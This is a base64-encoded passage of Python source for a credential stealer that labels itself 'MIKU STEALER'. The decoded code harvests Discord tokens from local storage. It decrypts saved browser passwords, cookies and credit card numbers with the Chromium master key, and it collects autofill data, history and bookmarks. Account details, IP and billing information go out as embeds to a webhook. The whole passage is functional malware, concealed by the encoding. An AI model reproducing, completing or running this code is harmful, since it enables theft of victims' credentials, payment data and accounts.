bGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCiAgICB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lID0gR2V0VG9rZW5JbmZvKHRva2VuKQ0KDQogICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9IiBpZiBwZnAgIT0gTm9uZSBlbHNlICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyNTkzMTg0MjUxMTgzMTk1LzdjOGY0NzYxMjNkMjhkMTAzZWZlMzgxNTQzMjc0YzI1LnBuZyINCiAgICBiaWxsaW5nID0gR2V0QmlsbGluZyh0b2tlbikNCiAgICBiYWRnZSA9IEdldEJhZGdlKGZsYWdzKQ0KICAgIGZyaWVuZHMgPSBUcmltKEdldFVIUUZyaWVuZHModG9rZW4pKQ0KICAgIGd1aWxkcyA9IFRyaW0oR2V0VUhRR3VpbGRzKHRva2VuKSkNCiAgICBjb2RlcyA9IFRyaW0oZ2V0Q29kZXModG9rZW4pKQ0KDQogICAgaWYgY29kZXMgPT0gIiI6IGNvZGVzID0gImBObyBDb2Rlc2AiDQogICAgaWYgYmlsbGluZyA9PSAiIjogYmlsbGluZyA9ICI6bG9jazoiDQogICAgaWYgYmFkZ2UgPT0gIiIgYW5kIG5pdHJvID09ICIiOiBiYWRnZSwgbml0cm8gPSAiOmxvY2s6IiwgIiINCiAgICBpZiBwaG9uZSA9PSAiIjogcGhvbmUgPSAiLSINCiAgICBpZiBmcmllbmRzID09ICIiOiBmcmllbmRzID0gIjpsb2NrOiINCiAgICBpZiBndWlsZHMgPT0gIiI6IGd1aWxkcyA9ICI6bG9jazoiDQogICAgcGF0aCA9IHBhdGgucmVwbGFjZSgiXFwiLCAiLyIpDQoNCiAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6IGYne0dMSU5GT31cblxuKipGb3VuZCBpbioqIGB7cGF0aH1gJywNCiAgICAgICAgImVtYmVkcyI6IFsNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICJjb2xvciI6IDc0MTk1MzAsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOnJvY2tldDogVG9rZW46IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge3Rva2VufWAiDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6VF9HbWFpbDo5MjY5Njk1MDExNTk5MTU1MjE+IEdtYWlsOiIgaWYgIkBnbWFpbC5jb20iIGluIGVtYWlsIGVsc2UgIjplX21haWw6IE1haWw6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2VtYWlsfWAiLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6bW9iaWxlX3Bob25lOiBQaG9uZToiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7cGhvbmV9YCIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6SV9FYXJ0aDo5MDc2NzQxOTA0NzAwNzQ0Mjk+IElQOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYHtJUH1gIiwNCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPDpDcm93bjo5MzA5MDY3MTAwMTk4MzM4NTY+IEJhZGdlczoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBuaXRybyArIGJhZGdlLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Y3JlZGl0X2NhcmQ6IEJpbGxpbmc6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogYmlsbGluZywNCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPDp3dW1wdXNXYXZlOjk0MzU1MzU5MjA2Mzg1MjU5ND4gSFEgRnJpZW5kczoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmcmllbmRzLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogRmFsc2UNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPDpJX0NvbXBhc3M6OTIzMzEyNjIzMTc5NjYxMzIyPiBIUSBHdWlsZHM6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZ3VpbGRzLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogRmFsc2UNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmdpZnQ6IEdpZnQgY29kZXM6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogY29kZXMsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSN7aGFzaHRhZ30gKHtpZGR9KSIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJATUlLVSBTVEVBTEVSIg0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAidGh1bWJuYWlsIjogew0KICAgICAgICAgICAgICAgICJ1cmwiOiBmIntwZnB9Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQoNCmRlZiBSZWZvcm1hdChsaXN0dCk6DQogICAgZSA9IHJlLmZpbmRhbGwoIihcdytbYS16XSkiLGxpc3R0KQ0KICAgIHdoaWxlICJodHRwcyIgaW4gZTogZS5yZW1vdmUoImh0dHBzIikNCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikNCiAgICB3aGlsZSAibmV0IiBpbiBlOiBlLnJlbW92ZSgibmV0IikNCiAgICByZXR1cm4gbGlzdChzZXQoZSkpDQoNCmRlZiB1cGxvYWQobmFtZSwgbGluayk6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KICAgIGlmICJOYXRpb25zR2xvcnkiIGluIG5hbWU6DQogICAgICAgIGRhdGEgPSB7DQogICAgICAgICAgICAiY29udGVudCI6IE5vbmUsDQogICAgICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAidGl0bGUiOiBmIlc0U1AgfCB7bmFtZS5zcGxpdCgnOycpWzBdfSIsDQogICAgICAgICAgICAgICAgImNvbG9yIjogMTU3ODE0MDMsDQogICAgICAgICAgICAgICAgImZpZWxkcyI6IGxpbmssDQogICAgICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiQE1JS1UgU1RFQUxFUiIsDQogICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIg0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgInRodW1ibmFpbCI6IHsNCiAgICAgICAgICAgICAgICAgICAgInVybCI6IG5hbWUuc3BsaXQoJzsnKVsxXQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsDQogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQ0KICAgICAgICAgICAgfQ0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KICAgICAgICByZXR1cm4NCiAgICANCiAgICBpZiBuYW1lID09ICJraXdpIjoNCiAgICAgICAgc3RyaW5nID0gbGluay5zcGxpdCgiXG5cbiIpDQogICAgICAgIGVuZGxpc3QgPSBbXQ0KICAgICAgICBmb3IgaSBpbiBzdHJpbmc6DQogICAgICAgICAgICBpID0gaS5zcGxpdCgiXG4iKQ0KICAgICAgICAgICAgaSA9IGxpc3QoZmlsdGVyKE5vbmUsIGkpKQ0KICAgICAgICAgICAgdmFsID0gIiINCiAgICAgICAgICAgIGZvciB4IGluIGk6DQogICAgICAgICAgICAgICAgaWYgeC5zdGFydHN3aXRoKCLilJTilIAiKToNCiAgICAgICAgICAgICAgICAgICAgdmFsICs9IHggKyAiXG4iDQogICAgICAgICAgICBpZiBsZW4oaSkgPiAxOg0KICAgICAgICAgICAgICAgIGVuZGxpc3QuYXBwZW5kKHsibmFtZSI6IGlbMF0sICJ2YWx1ZSI6IHZhbCwgImlubGluZSI6IEZhbHNlfSkNCiAgICAgICAgZGF0YSA9IHsNCiAgICAgICAgICAgICJjb250ZW50IjogR0xJTkZPLA0KICAgICAgICAgICAgImVtYmVkcyI6IFsNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgImNvbG9yIjogNzQxOTUzMCwNCiAgICAgICAgICAgICAgICAiZmllbGRzIjogZW5kbGlzdCwNCiAgICAgICAgICAgICAgICAiYXV0aG9yIjogew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJGSUxFIFNURUFMRVIiDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAiZm9vdGVyIjogew0KICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJATUlLVSBTVEVBTEVSIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgICAgIH0NCiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgcmV0dXJuDQoNCmRlZiB3cml0ZWZvcmZpbGUoZGF0YSwgbmFtZSk6DQogICAgcGF0aCA9IG9zLmdldGVudigiVEVNUCIpICsgZiJcd3B7bmFtZX0udHh0Ig0KICAgIHdpdGggb3BlbihwYXRoLCBtb2RlPSd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgZm9yIGxpbmUgaW4gZGF0YToNCiAgICAgICAgICAgIGlmIGxpbmVbMF0gIT0gJyc6DQogICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikNCg0KZGVmIGdldFRva2VuKHBhdGgsIGFyZyk6DQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgIHBhdGggKz0gYXJnDQogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoKToNCiAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgiLmxvZyIpIG9yIGZpbGUuZW5kc3dpdGgoIi5sZGIiKSAgIDoNCiAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmIntwYXRofVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyNSwxMTB9IiwgciJtZmFcLltcdy1dezgwLDk1fSIpOg0KICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgICAgICBnbG9iYWwgVG9rZW5zDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGVja1Rva2VuKHRva2VuKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW4gaW4gVG9rZW5zOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMgKz0gdG9rZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsb2FkVG9rZW4odG9rZW4sIHBhdGgpDQoNCg0KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6DQogICAgdHJ5Og0KICAgICAgICBnbG9iYWwgUGFzc3csIFBhc3N3Q291bnQNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0xvZ2luIERhdGEiDQogICAgICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuDQoNCiAgICAgICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiDQoNCiAgICAgICAgc2h1dGlsLmNvcHkyKHBhdGhDLCB0ZW1wZm9sZCkNCiAgICAgICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQ0KICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zOyIpDQogICAgICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQ0KICAgICAgICBjdXJzb3IuY2xvc2UoKQ0KICAgICAgICBjb25uLmNsb3NlKCkNCiAgICAgICAgb3MucmVtb3ZlKHRlbXBmb2xkKQ0KDQogICAgICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCiAgICAgICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQ0KICAgICAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pDQoNCiAgICAgICAgZm9yIHJvdyBpbiBkYXRhOg0KICAgICAgICAgICAgaWYgcm93WzBdICE9ICcnOg0KICAgICAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOg0KICAgICAgICAgICAgICAgICAgICBvbGQgPSB3YQ0KICAgICAgICAgICAgICAgICAgICBpZiAiaHR0cHMiIGluIHdhOg0KICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gd2ENCiAgICAgICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQ0KICAgICAgICAgICAgICAgICAgICBpZiB3YSBpbiByb3dbMF06DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpDQogICAgICAgICAgICAgICAgUGFzc3cuYXBwZW5kKGYiVVIxOiB7cm93WzBdfSB8IFU1M1JONE0zOiB7cm93WzFdfSB8IFA0NTVXMFJEOiB7RGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSl9IikNCiAgICAgICAgICAgICAgICBQYXNzd0NvdW50ICs9IDENCiAgICAgICAgd3JpdGVmb3JmaWxlKFBhc3N3LCAncGFzc3dvcmRzJykNCiAgICBleGNlcHQ6cGFzcw0KZGVmIGdldENvb2tpZShwYXRoLCBhcmcpOg0KICAgIHRyeToNCiAgICAgICAgZ2xvYmFsIENvb2tpZXMsIENvb2tpQ291bnQNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0Nvb2tpZXMiDQogICAgICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuDQoNCiAgICAgICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiDQoNCiAgICAgICAgc2h1dGlsLmNvcHkyKHBhdGhDLCB0ZW1wZm9sZCkNCiAgICAgICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQ0KICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIGVuY3J5cHRlZF92YWx1ZSBGUk9NIGNvb2tpZXMgIikNCiAgICAgICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpDQogICAgICAgIGN1cnNvci5jbG9zZSgpDQogICAgICAgIGNvbm4uY2xvc2UoKQ0KICAgICAgICBvcy5yZW1vdmUodGVtcGZvbGQpDQoNCiAgICAgICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIg0KDQogICAgICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICAgICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQ0KICAgICAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQ0KDQogICAgICAgIGZvciByb3cgaW4gZGF0YToNCiAgICAgICAgICAgIGlmIHJvd1swXSAhPSAnJzoNCiAgICAgICAgICAgICAgICBmb3Igd2EgaW4ga2V5d29yZDoNCiAgICAgICAgICAgICAgICAgICAgb2xkID0gd2ENCiAgICAgICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToNCiAgICAgICAgICAgICAgICAgICAgICAgIHRtcCA9IHdhDQogICAgICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0NCiAgICAgICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9sZCBpbiBjb29raVdvcmRzOiBjb29raVdvcmRzLmFwcGVuZChvbGQpDQogICAgICAgICAgICAgICAgQ29va2llcy5hcHBlbmQoZiJIMDU3IEszWToge3Jvd1swXX0gfCBONE0zOiB7cm93WzFdfSB8IFY0MVUzOiB7RGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSl9IikNCiAgICAgICAgICAgICAgICBDb29raUNvdW50ICs9IDENCiAgICAgICAgd3JpdGVmb3JmaWxlKENvb2tpZXMsICdjb29raWVzJykNCiAgICBleGNlcHQ6cGFzcw0KZGVmIGdldENDcyhwYXRoLCBhcmcpOg0KICAgIHRyeToNCiAgICAgICAgZ2xvYmFsIENDcywgQ0NzQ291bnQNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL1dlYiBEYXRhIg0KICAgICAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybg0KDQogICAgICAgIHRlbXBmb2xkID0gdGVtcCArICJ3cCIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIg0KDQogICAgICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpDQogICAgICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkNCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHMgIikNCiAgICAgICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpDQogICAgICAgIGN1cnNvci5jbG9zZSgpDQogICAgICAgIGNvbm4uY2xvc2UoKQ0KICAgICAgICBvcy5yZW1vdmUodGVtcGZvbGQpDQoNCiAgICAgICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIg0KICAgICAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpDQogICAgICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkNCiAgICAgICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCg0KICAgICAgICBmb3Igcm93IGluIGRhdGE6DQogICAgICAgICAgICBpZiByb3dbMF0gIT0gJyc6DQogICAgICAgICAgICAgICAgQ0NzLmFwcGVuZChmIkM0UkQgTjRNMzoge3Jvd1sxXX0gfCBOVU1CM1I6IHtEZWNyeXB0VmFsdWUocm93WzRdLCBtYXN0ZXJfa2V5KX0gfCBFWFBJUlk6IHtyb3dbMl19L3tyb3dbM119IikNCiAgICAgICAgICAgICAgICBDQ3NDb3VudCArPSAxDQogICAgICAgIHdyaXRlZm9yZmlsZShDQ3MsICdjcmVkaXRjYXJkcycpDQogICAgZXhjZXB0OnBhc3MNCmRlZiBnZXRBdXRvZmlsbChwYXRoLCBhcmcpOg0KICAgIHRyeToNCiAgICAgICAgZ2xvYmFsIEF1dG9maWxsLCBBdXRvZmlsbENvdW50DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuDQoNCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9XZWIgRGF0YSINCiAgICAgICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4NCg0KICAgICAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiINCg0KICAgICAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQ0KICAgICAgICBjb25uID0gc3FsX2Nvbm5lY3QodGVtcGZvbGQpDQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCAqIEZST00gYXV0b2ZpbGwgV0hFUkUgdmFsdWUgTk9UIE5VTEwiKQ0KICAgICAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICAgICAgY3Vyc29yLmNsb3NlKCkNCiAgICAgICAgY29ubi5jbG9zZSgpDQogICAgICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgICAgICBmb3Igcm93IGluIGRhdGE6DQogICAgICAgICAgICBpZiByb3dbMF0gIT0gJyc6DQogICAgICAgICAgICAgICAgQXV0b2ZpbGwuYXBwZW5kKGYiTjRNMzoge3Jvd1swXX0gfCBWNExVMzoge3Jvd1sxXX0iKQ0KICAgICAgICAgICAgICAgIEF1dG9maWxsQ291bnQgKz0gMQ0KICAgICAgICB3cml0ZWZvcmZpbGUoQXV0b2ZpbGwsICdhdXRvZmlsbCcpDQogICAgZXhjZXB0OnBhc3MNCmRlZiBnZXRIaXN0b3J5KHBhdGgsIGFyZyk6DQogICAgdHJ5Og0KICAgICAgICBnbG9iYWwgSGlzdG9yeSwgSGlzdG9yeUNvdW50DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuDQoNCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIkhpc3RvcnkiDQogICAgICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuDQogICAgICAgIHRlbXBmb2xkID0gdGVtcCArICJ3cCIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIg0KDQogICAgICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpDQogICAgICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkNCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUICogRlJPTSB1cmxzIikNCiAgICAgICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpDQogICAgICAgIGN1cnNvci5jbG9zZSgpDQogICAgICAgIGNvbm4uY2xvc2UoKQ0KICAgICAgICBvcy5yZW1vdmUodGVtcGZvbGQpDQogICAgICAgIGZvciByb3cgaW4gZGF0YToNCiAgICAgICAgICAgIGlmIHJvd1swXSAhPSAnJzoNCiAgICAgICAgICAgICAgICBIaXN0b3J5LmFwcGVuZChyb3dbMV0pDQogICAgICAgICAgICAgICAgSGlzdG9yeUNvdW50ICs9IDENCiAgICAgICAgd3JpdGVmb3JmaWxlKEhpc3RvcnksICdoaXN0b3J5JykNCiAgICBleGNlcHQ6cGFzcw0KZGVmIGdldHdlYnNpdGVzKFdvcmRzKToNCiAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIFdvcmRzKQ0KICAgIGlmIGxlbihyYikgPiAxMDAwOg0KICAgICAgICBycnJyciA9IFJlZm9ybWF0KHN0cihXb3JkcykpDQogICAgICAgIHJldHVybiAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnJycikNCiAgICBlbHNlOiByZXR1cm4gcmINCg0KZGVmIGdldEJvb2ttYXJrcyhwYXRoLCBhcmcpOg0KICAgIHRyeToNCiAgICAgICAgZ2xvYmFsIEJvb2ttYXJrcywgQm9va21hcmtzQ291bnQNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiQm9va21hcmtzIg0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6DQogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aEMsICdyJywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOg0KICAgICAgICAgICAgICAgIGRhdGEgPSBqc29uX2xvYWRzKGYucmVhZCgpKQ0KICAgICAgICAgICAgICAgIGZvciBpIGluIGRhdGFbJ3Jvb3RzJ11bJ2Jvb2ttYXJrX2JhciddWydjaGlsZHJlbiddOg0KICAgICAgICAgICAgICAgICAgICB